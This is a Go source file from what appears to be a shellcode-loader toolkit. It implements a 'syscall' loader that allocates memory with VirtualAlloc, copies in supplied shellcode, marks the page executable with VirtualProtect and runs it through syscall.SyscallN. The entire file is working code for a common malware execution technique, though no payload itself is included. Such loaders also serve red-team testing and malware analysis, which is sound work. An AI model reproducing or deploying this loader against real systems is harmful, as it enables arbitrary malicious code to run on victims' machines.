package loaders

import (
	"fmt"
	"github.com/ma111e/moonboots/internal/consts"
	"github.com/ma111e/moonboots/internal/defs"
	log "github.com/sirupsen/logrus"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

/*
This technique executes shellcode in the current process using the following steps
	1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
	2. Copy the shellcode to the allocated memory space
	3. Change the memory page permissions to Execute/Read with VirtualProtect
	4. Use syscall to execute the entrypoint of the shellcode

This technique loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
*/

const (
	LdrSyscall = "syscall"
)

type SyscallLoader struct {
	Base
}

func init() {
	AvailableLoaders.Register(LdrSyscall, &SyscallLoader{})
}

func (ldr SyscallLoader) ValidArchs() []string {
	return consts.VALID_ARCH_AMD64
}

func (ldr SyscallLoader) Run(shellcode []byte) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")

	log.Debugln("Calling VirtualAlloc for shellcode")
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), defs.MEM_COMMIT|defs.MEM_RESERVE, defs.PAGE_READWRITE)

	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualAlloc: %s", err)
	}

	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed and returned 0")
	}

	log.Printf("Allocated %d bytes", len(shellcode))

	log.Debugln("Copying shellcode to memory with copy")

	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)

	log.Println("Shellcode copied to memory")

	log.Debugln("Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")

	oldProtect := defs.PAGE_READWRITE
	_, _, err = VirtualProtect.Call(addr, uintptr(len(shellcode)), defs.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualProtect: %s", err)
	}
	log.Println("Shellcode memory region changed to PAGE_EXECUTE_READ")

	log.Debugln("Executing Shellcode")
	_, _, err = syscall.SyscallN(addr)

	if err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error executing shellcode syscall: %s", err)
	}
	log.Println("Shellcode Executed")

	return nil
}
